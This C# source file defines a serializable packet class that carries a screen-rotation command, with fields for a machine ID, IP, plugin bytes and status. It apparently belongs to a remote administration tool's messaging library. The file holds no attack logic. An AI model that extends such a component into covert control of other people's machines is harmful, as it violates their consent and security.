using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class ScreenRotationPacket : IPacket
    {
        public ScreenRotationPacket(string degrees) : base()
        {
            this.PacketType = PacketType.MISC_SCREEN_ROTATION;

            this.degrees = degrees; 
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string degrees { get; set; }
    }
}
